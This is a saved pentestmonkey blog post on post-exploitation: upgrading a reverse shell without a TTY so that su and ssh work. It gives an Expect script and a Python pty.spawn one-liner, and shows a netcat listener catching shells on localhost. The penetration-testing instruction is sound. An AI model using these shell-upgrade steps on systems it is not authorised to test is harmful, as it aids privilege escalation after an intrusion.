<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0061)http://pentestmonkey.net/blog/post-exploitation-without-a-tty -->
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US" xml:lang="en-US"><head profile="http://gmpg.org/xfn/11"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Post-Exploitation Without A TTY | pentestmonkey</title>
<link rel="stylesheet" href="./Post-Exploitation Without A TTY _ pentestmonkey_files/style.css" type="text/css" media="screen">
<link rel="pingback" href="http://pentestmonkey.net/xmlrpc.php">
<link rel="alternate" type="application/rss+xml" title="pentestmonkey » Feed" href="http://pentestmonkey.net/feed">
<link rel="alternate" type="application/rss+xml" title="pentestmonkey » Comments Feed" href="http://pentestmonkey.net/comments/feed">
<link rel="alternate" type="application/rss+xml" title="pentestmonkey » Post-Exploitation Without A TTY Comments Feed" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty/feed">
<script type="text/javascript" src="./Post-Exploitation Without A TTY _ pentestmonkey_files/l10n.js.download"></script>
<script type="text/javascript" src="./Post-Exploitation Without A TTY _ pentestmonkey_files/jquery.js.download"></script>
<script type="text/javascript" src="./Post-Exploitation Without A TTY _ pentestmonkey_files/jquery.ddmenu.js.download"></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://pentestmonkey.net/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://pentestmonkey.net/wp-includes/wlwmanifest.xml"> 
<link rel="index" title="pentestmonkey" href="http://pentestmonkey.net/">
<link rel="start" title="A Penetration Testing Site" href="http://pentestmonkey.net/site-news/a-penetration-testing-site">
<link rel="prev" title="Updated Postgres SQL Injection Cheat Sheet" href="http://pentestmonkey.net/blog/postgresics-update">
<link rel="next" title="Update: smtp-user-enum v1.1" href="http://pentestmonkey.net/blog/smtp-user-enum-1-1">
<meta name="generator" content="WordPress 3.2.1">
<link rel="canonical" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">
<link rel="shortlink" href="http://pentestmonkey.net/?p=35">
<!--[if lte IE 7]><link href="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/ie.css" rel="stylesheet" media="screen" type="text/css" /><![endif]-->	
<!--[if IE 6]><script src="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/js/DD_belatedPNG.js"></script><![endif]-->
</head>
<body class="single single-post postid-35 single-format-standard">
	<div class="all-page">
		
		<div class="container">
			
			<!-- HEADER -->
			<div id="header">
			    <div class="website-name"><a href="http://pentestmonkey.net/">pentestmonkey</a></div>
				<div class="slogan">Taking the monkey work out of pentesting</div>
			</div>
			<!-- /HEADER -->

			<!-- main NAVIGATION -->
			<div id="mainNav">
				<div class="wrap">
    <div class="menu-cheat-sheets-container"><ul id="menu-cheat-sheets" class="menu"><li id="menu-item-133" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-133"><a href="http://pentestmonkey.net/category/site-news"><span>Site News</span></a></li>
<li id="menu-item-130" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-130"><a href="http://pentestmonkey.net/category/blog"><span>Blog</span></a></li>
<li id="menu-item-136" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-136"><a href="http://pentestmonkey.net/category/tools"><span>Tools</span></a></li>
<li id="menu-item-137" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-137"><a href="http://pentestmonkey.net/category/yaptest"><span>Yaptest</span></a></li>
<li id="menu-item-134" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-134"><a href="http://pentestmonkey.net/category/cheat-sheet"><span>Cheat Sheets</span></a></li>
<li id="menu-item-135" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-135"><a href="http://pentestmonkey.net/category/contact"><span>Contact</span></a></li>
</ul></div>				</div>
			</div>
			<!-- /main NAVIGATION -->
			<div class="clear"></div>


			<!-- CONTENT -->
			<div id="content">

	<!-- Start: Left Panel -->
	<div class="content">

	
		<div class="post-35 post type-post status-publish format-standard hentry category-blog tag-expect tag-pentest tag-perl tag-python tag-tty" id="post-35">
			<h1>Post-Exploitation Without A TTY</h1>

			<div class="entryContent">
				<p>This is a follow-up to a topic I touched on breifly <a href="http://pentestmonkey.net/blog/ssh-with-no-tty/">before</a> when I talked about the problem of trying to use the SSH client when you don’t have a TTY.&nbsp; I was recently in a position where I got an interactive shell on a box, discovered the root password but was unable to get root because I couldn’t run “login” or “su”.&nbsp; Both of these required a TTY in order to work.</p>
<p>I don’t present a definitive solution in this problem (if you have one please sent it in!).&nbsp; However I discuss a couple of approaches to getting a TTY…</p>
<p><span id="more-35"></span></p>
<p>Post-exploitation activities during a pentest may involve using “su” to try and log into other local accounts, or using “ssh” to log into other hosts.</p>
<h3>Using “Expect” To Get A TTY</h3>
<p>If you’re lucky enough to have the <a href="http://en.wikipedia.org/wiki/Expect">Expect</a> language installed just a few lines of code will get you a good enough TTY to run useful tools such as “ssh”, “su” and “login”.</p>
<pre>$ cat sh.exp
#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact</pre>
<p>The following output taken from a <a href="http://pentestmonkey.net/tools/php-reverse-shell/">reverse shell</a> demonstrates how “su” doesn’t work until we use the Expect script:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48257
sh: no job control in this shell
sh-3.2$ su -
su: must be run from a terminal
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ su -
Password:&nbsp; mypassword
localhost ~ #</pre>
<p>Likewise, the ssh client doesn’t seem to work properly (with or without the -T option):</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33250
sh: no job control in this shell
sh-3.2$ ssh localhost
Pseudo-terminal will not be allocated because stdin is not a terminal.
&lt;big pause&gt;</pre>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33252
sh: no job control in this shell
sh-3.2$ ssh -T localhost
&lt;big pause&gt;</pre>
<p>After we run sh.exp we are able to use the ssh client as normal:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43498
sh: no job control in this shell
sh-3.2$ expect sh.exp
spawn sh
sh-3.2$ ssh localhost
ssh localhost
Password: mypassword
Last login: Wed Jan 16 13:43:20 2008 from 127.0.0.1

user@localhost ~ $</pre>
<h3>Using Python To Get A TTY</h3>
<p>This is quite an elegant solution I found on <a href="http://tero.marttila.de/">Tero’s glob</a>.&nbsp; It should be effective against gentoo systems at least because the gentoo package management runs on python.</p>
<p>$ nc -v -n -l -p 1234<br>
listening on [any] 1234 …<br>
sh: no job control in this shell<br>
sh-3.2$ su -<br>
su: must be run from a terminal<br>
sh-3.2$ python -c ‘import pty; pty.spawn(“/bin/sh”)’<br>
sh-3.2$ su -<br>
su -<br>
Password:<br>
localhost ~ #</p>
<h3>Using PERL To Get A TTY</h3>
<p>This is not such as great solution as IO::Pty isn’t installed by default on any system I’ve seen.&nbsp; For completeness, though:</p>
<p>&lt;hmmm… can’t get it will working.&nbsp; Will post later.&gt;</p>
<pre></pre>
                <div class="clear"></div>
								<p>Tags: <a href="http://pentestmonkey.net/tag/expect" rel="tag">expect</a>, <a href="http://pentestmonkey.net/tag/pentest" rel="tag">pentest</a>, <a href="http://pentestmonkey.net/tag/perl" rel="tag">perl</a>, <a href="http://pentestmonkey.net/tag/python" rel="tag">python</a>, <a href="http://pentestmonkey.net/tag/tty" rel="tag">tty</a></p>				<p>Posted in <a href="http://pentestmonkey.net/category/blog" title="View all posts in Blog" rel="category tag">Blog</a></p>
				
			</div>
		</div>

	
<!-- You can start editing here. -->


			<!-- If comments are open, but there are no comments. -->

	 
<p></p>
<br>


								




	
	</div>
				<!-- sidebar -->
				<div class="sideBar">
					
					<div class="nav">
						<div class="bFrameT"><i></i></div>
	<form method="get" id="searchform" action="http://pentestmonkey.net/" class="searchForm">
	<p><input type="text" value="" name="s" id="s" class="field">
	<input type="image" src="./Post-Exploitation Without A TTY _ pentestmonkey_files/search.gif" alt="" title="Search" id="searchsubmit" class="btn"></p>
</form>
<h3><span>Categories</span></h3>		<ul>
	<li class="cat-item cat-item-5"><a href="http://pentestmonkey.net/category/blog" title="View all posts filed under Blog">Blog</a> (78)
</li>
	<li class="cat-item cat-item-39"><a href="http://pentestmonkey.net/category/cheat-sheet" title="View all posts filed under Cheat Sheets">Cheat Sheets</a> (10)
<ul class="children">
	<li class="cat-item cat-item-40"><a href="http://pentestmonkey.net/category/cheat-sheet/shells" title="View all posts filed under Shells">Shells</a> (1)
</li>
	<li class="cat-item cat-item-8"><a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" title="View all posts filed under SQL Injection">SQL Injection</a> (7)
</li>
</ul>
</li>
	<li class="cat-item cat-item-7"><a href="http://pentestmonkey.net/category/contact" title="View all posts filed under Contact">Contact</a> (2)
</li>
	<li class="cat-item cat-item-3"><a href="http://pentestmonkey.net/category/site-news" title="View all posts filed under Site News">Site News</a> (3)
</li>
	<li class="cat-item cat-item-4"><a href="http://pentestmonkey.net/category/tools" title="View all posts filed under Tools">Tools</a> (17)
<ul class="children">
	<li class="cat-item cat-item-14"><a href="http://pentestmonkey.net/category/tools/audit" title="View all posts filed under Audit">Audit</a> (3)
</li>
	<li class="cat-item cat-item-16"><a href="http://pentestmonkey.net/category/tools/misc" title="View all posts filed under Misc">Misc</a> (7)
</li>
	<li class="cat-item cat-item-13"><a href="http://pentestmonkey.net/category/tools/user-enumeration" title="View all posts filed under User Enumeration">User Enumeration</a> (4)
</li>
	<li class="cat-item cat-item-15"><a href="http://pentestmonkey.net/category/tools/web-shells" title="View all posts filed under Web Shells">Web Shells</a> (3)
</li>
</ul>
</li>
	<li class="cat-item cat-item-1"><a href="http://pentestmonkey.net/category/uncategorized" title="View all posts filed under Uncategorized">Uncategorized</a> (3)
</li>
	<li class="cat-item cat-item-6"><a href="http://pentestmonkey.net/category/yaptest" title="View all posts filed under Yaptest">Yaptest</a> (15)
<ul class="children">
	<li class="cat-item cat-item-12"><a href="http://pentestmonkey.net/category/yaptest/front-end" title="View all posts filed under Front End">Front End</a> (1)
</li>
	<li class="cat-item cat-item-9"><a href="http://pentestmonkey.net/category/yaptest/installing" title="View all posts filed under Installing">Installing</a> (2)
</li>
	<li class="cat-item cat-item-11"><a href="http://pentestmonkey.net/category/yaptest/overview" title="View all posts filed under Overview">Overview</a> (2)
</li>
	<li class="cat-item cat-item-10"><a href="http://pentestmonkey.net/category/yaptest/using" title="View all posts filed under Using">Using</a> (8)
</li>
</ul>
</li>
		</ul>
<h3><span> <a href="http://pentestmonkey.net/rss/" class="mainlevel-nav" rel="alternate" type="application/rss+xml"><img src="./Post-Exploitation Without A TTY _ pentestmonkey_files/feed-icon16x16.png" alt="" style="vertical-align:middle;border:0"></a>&nbsp;<a href="http://pentestmonkey.net/rss/" class="mainlevel-nav" rel="alternate" type="application/rss+xml">RSS Feed</a><p></p> <link rel="alternate" type="application/rss+xml" title="Pentestmonkey RSS Feed" href="http://pentestmonkey.net/rss/"> </span></h3>
			
						<div class="bFrameB"><i></i></div>
					</div>
					
				</div>
				<!-- /sidebar -->
	
				</div>
				<!-- /content -->
				
			</div>
			<!-- /CONTENT -->	
			
		
		<!-- bottom NAVIGATION -->
		<div id="bottomNav">
		</div>
		<!-- /bottom NAVIGATION -->
		
		<!-- FOOTER -->
		<div id="footer">
         <div class="menu"></div>
			
			
		</div>
		<!-- /FOOTER -->
	</div>
		


<script src="./Post-Exploitation Without A TTY _ pentestmonkey_files/urchin.js.download" type="text/javascript">
</script>
<script type="text/javascript">
_uacct = "UA-2082472-1";
urchinTracker();
</script>



</body></html>